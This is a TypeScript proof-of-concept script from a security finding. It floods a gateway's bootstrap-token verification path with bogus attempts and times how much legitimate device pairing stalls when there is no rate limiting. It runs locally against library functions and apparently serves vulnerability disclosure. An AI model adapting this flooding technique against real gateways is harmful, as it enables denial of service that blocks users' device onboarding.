/**
 * PoC: Bootstrap token mutex stall (Finding 1)
 *
 * The gateway serialises all verifyDeviceBootstrapToken() calls through a
 * single in-process promise-chain mutex (createAsyncLock in json-files.ts).
 * Because there is no rate limiting on the bootstrap-token auth path, an
 * attacker who can reach the gateway WebSocket can queue N bogus verify calls
 * before the legitimate device's call, stalling real pairing by N * (disk I/O
 * per attempt).
 *
 * Usage:
 *   node --import tsx/esm scripts/poc-bootstrap-dos.ts [--count N]
 */

import { randomBytes } from "node:crypto";
import { rm, mkdtemp } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import {
  issueDeviceBootstrapToken,
  verifyDeviceBootstrapToken,
} from "../src/infra/device-bootstrap.js";

const ATTACKER_COUNTS = [10, 50, 200, 500];

function fakeDevice() {
  return {
    deviceId: "device-" + randomBytes(8).toString("hex"),
    publicKey: randomBytes(32).toString("base64"),
  };
}

async function baseline(baseDir: string, token: string, device: ReturnType<typeof fakeDevice>) {
  const t0 = performance.now();
  const result = await verifyDeviceBootstrapToken({
    token,
    ...device,
    role: "operator",
    scopes: ["operator.read"],
    baseDir,
  });
  return { ms: performance.now() - t0, result };
}

async function runScenario(baseDir: string, attackerCount: number) {
  const legitDevice = fakeDevice();

  // Issue a fresh unbound token — simulates the setup QR code being shown
  const { token } = await issueDeviceBootstrapToken({ baseDir });

  // Attacker floods N bogus verify calls synchronously so they all queue
  // on the mutex BEFORE the legitimate device call below
  const attackerCalls: Promise<unknown>[] = [];
  for (let i = 0; i < attackerCount; i++) {
    attackerCalls.push(
      verifyDeviceBootstrapToken({
        token: randomBytes(32).toString("base64url"), // wrong token every time
        deviceId: "attacker-" + i,
        publicKey: randomBytes(32).toString("base64"),
        role: "operator",
        scopes: ["operator.read"],
        baseDir,
      }),
    );
  }

  // Legitimate device attempts to pair — queued behind all attacker calls
  const t0 = performance.now();
  const legitCall = verifyDeviceBootstrapToken({
    token,
    ...legitDevice,
    role: "operator",
    scopes: ["operator.read"],
    baseDir,
  });

  const [legitResult] = await Promise.all([legitCall, Promise.all(attackerCalls)]);
  const elapsedMs = performance.now() - t0;

  return { elapsedMs, result: legitResult };
}

async function main() {
  const baseDir = await mkdtemp(join(tmpdir(), "openclaw-poc-"));

  try {
    console.log("=".repeat(60));
    console.log("PoC: Bootstrap token mutex stall");
    console.log("=".repeat(60));

    // Baseline: legitimate pairing with no attacker load
    const { token: baseToken } = await issueDeviceBootstrapToken({ baseDir });
    const { ms: baseMs, result: baseResult } = await baseline(baseDir, baseToken, fakeDevice());
    console.log(
      `\nBaseline (no attacker): ${baseMs.toFixed(1)}ms  result=${JSON.stringify(baseResult)}`,
    );
    console.log();

    for (const count of ATTACKER_COUNTS) {
      const { elapsedMs, result } = await runScenario(baseDir, count);
      const factor = elapsedMs / baseMs;
      const bar = "█".repeat(Math.min(Math.round(factor), 60));
      console.log(
        `Attacker calls: ${String(count).padStart(4)}  ` +
          `stall: ${elapsedMs.toFixed(0).padStart(6)}ms  ` +
          `(${factor.toFixed(1)}x)  ${bar}  result=${JSON.stringify(result)}`,
      );
    }

    console.log();
    console.log(
      "CONCLUSION: Legitimate device pairing is stalled proportionally to the\n" +
        "number of bogus bootstrap-token attempts queued before it. No rate limit\n" +
        "means an attacker can push this to seconds or minutes during the 10-min\n" +
        "pairing window, breaking or significantly delaying device onboarding.",
    );
  } finally {
    await rm(baseDir, { recursive: true, force: true });
  }
}

main().catch((err) => {
  console.error(err);
  process.exit(1);
});
